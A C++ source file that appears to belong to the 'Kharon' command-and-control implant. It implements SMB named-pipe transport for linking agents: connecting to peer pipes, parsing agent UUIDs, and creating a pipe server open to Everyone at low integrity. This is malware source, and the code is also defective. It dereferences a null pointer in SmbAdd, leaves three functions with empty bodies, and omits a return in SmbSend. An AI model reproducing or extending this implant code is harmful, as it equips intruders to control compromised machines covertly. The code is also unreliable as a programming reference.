#include <Kharon.h>

auto Transport::SmbAdd(
    _In_ CHAR* NamedPipe,
    _In_ PVOID Parser,
    _In_ PVOID Package
) -> PVOID {
    SMB_PROFILE_DATA* SmbData = nullptr;

    SmbData->Pkg = static_cast<PACKAGE*>( Package );
    SmbData->Psr = static_cast<PARSER*>( Parser );

    BOOL   Success = FALSE;
    ULONG  BuffLen = 0;
    BYTE*  Buffer  = nullptr;

    HANDLE Handle  = Self->Krnl32.CreateFileA( 
        NamedPipe, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr 
    );
    if ( Handle == INVALID_HANDLE_VALUE || ! Handle ) {
        KhDbg( "named pipe not found: %d", KhGetError ); return nullptr;
    }

    if ( KhGetError == ERROR_PIPE_BUSY ) {
        if ( ! Self->Krnl32.WaitNamedPipeA( NamedPipe, 6500 ) ) {
            return nullptr;
        }
    }

    while ( 1 ) {
        if ( Self->Krnl32.PeekNamedPipe( Handle, nullptr, 0, 0, &BuffLen, 0 ) ) {
            if ( ! BuffLen ) {
                KhDbg( "no data available from named pipe" );
                return nullptr;
            }

            KhDbg( "%d available from named pipe", BuffLen );

            Buffer = (BYTE*)hAlloc( BuffLen );

            if ( Self->Krnl32.ReadFile( Handle, Buffer, BuffLen, &BuffLen, nullptr ) ) {
                KhDbg( "read pipe buffer with success: %d", BuffLen ); break;
            } else {
                KhDbg( "failed to read pipe buffer: %d", KhGetError ); Self->Ntdll.NtClose( Handle ); return nullptr;
            }
        } else {
            KhDbg( "get pipe buffer length with failure: %d", KhGetError );
        }
    }

    CHAR* TmpUUID = (CHAR*)hAlloc( 36+1 );

    Mem::Copy( TmpUUID, Buffer, 36 );

    KhDbg( "parsed uuid: %s", TmpUUID );

    SmbData = (SMB_PROFILE_DATA*)hAlloc( sizeof( SMB_PROFILE_DATA ) );

    SmbData->Handle      = Handle;
    SmbData->Pkg->Buffer = Buffer;
    SmbData->Pkg->Length = BuffLen;
    SmbData->SmbUUID     = TmpUUID;
    SmbData->AgentUUID   = TmpUUID;
    

    if ( ! this->Pipe.Node ) {
        this->Pipe.Node = SmbData;
    } else {
        SMB_PROFILE_DATA* Current = static_cast<SMB_PROFILE_DATA*>( this->Pipe.Node );

        while ( Current->Next ) {
            Current = Current->Next;
        }

        Current->Next = SmbData;
    }

    return SmbData;
}

auto Transport::SmbRm(
    _In_ PVOID SmbData
) -> BOOL {

}

auto Transport::SmbList(
    VOID
) -> PVOID {

}

auto Transport::SmbGet(
    _In_ CHAR* SmbUUID
) -> PVOID {
    
}

#if PROFILE_C2 == PROFILE_SMB
auto Transport::SmbSend(
    _In_      PVOID   Data,
    _In_      UINT64  Size,
    _Out_opt_ PVOID  *RecvData,
    _Out_opt_ UINT64 *RecvSize
) -> BOOL {
    SECURITY_ATTRIBUTES* SecAttr = (SECURITY_ATTRIBUTES*)hAlloc( sizeof( SECURITY_ATTRIBUTES ) );
    SECURITY_DESCRIPTOR* SecDesc = (SECURITY_DESCRIPTOR*)hAlloc( SECURITY_DESCRIPTOR_MIN_LENGTH );

    SID_IDENTIFIER_AUTHORITY SidAuth  = SECURITY_WORLD_SID_AUTHORITY;
    SID_IDENTIFIER_AUTHORITY SidLabel = SECURITY_MANDATORY_LABEL_AUTHORITY;
    EXPLICIT_ACCESSA         Access   = { 0 };

    SID* Sidl = nullptr;
    SID* Sid  = nullptr;

    ULONG sadasda = 0;
    ACL* SAcl = nullptr;  
    ACL* DAcl = nullptr;

    Self->Advapi32.AllocateAndInitializeSid( &SidAuth, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, (PSID*)&Sid );

    Access.Trustee.TrusteeType  = TRUSTEE_IS_WELL_KNOWN_GROUP;
    Access.Trustee.TrusteeForm  = TRUSTEE_IS_SID;
    Access.Trustee.ptstrName    = (CHAR*)Sid;
    Access.grfAccessMode        = SET_ACCESS;
    Access.grfInheritance       = NO_INHERITANCE;
    Access.grfAccessPermissions = SPECIFIC_RIGHTS_ALL | STANDARD_RIGHTS_ALL;

    Self->Advapi32.SetEntriesInAclA( 1, &Access, nullptr, &DAcl );

    Self->Advapi32.AllocateAndInitializeSid( &SidLabel, 1, SECURITY_MANDATORY_LOW_RID, 0, 0, 0, 0, 0, 0, 0, (PSID*)&Sidl );

    Self->Advapi32.InitializeSecurityDescriptor( SecDesc, SECURITY_DESCRIPTOR_REVISION );

    Self->Advapi32.SetSecurityDescriptorDacl( SecDesc, TRUE, DAcl, FALSE );

    Self->Advapi32.SetSecurityDescriptorSacl( SecDesc, TRUE, SAcl, FALSE );

    SecAttr->bInheritHandle       = FALSE;
    SecAttr->nLength              = sizeof( SECURITY_ATTRIBUTES );
    SecAttr->lpSecurityDescriptor = SecDesc;

    this->Pipe.Handle = Self->Krnl32.CreateNamedPipeA( 
        this->Pipe.Name, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, 
        PIPE_UNLIMITED_INSTANCES, PIPE_BUFFER_LENGTH, PIPE_BUFFER_LENGTH, 0, SecAttr
    );

    Self->Krnl32.ConnectNamedPipe( this->Pipe.Handle, nullptr );
}
#endif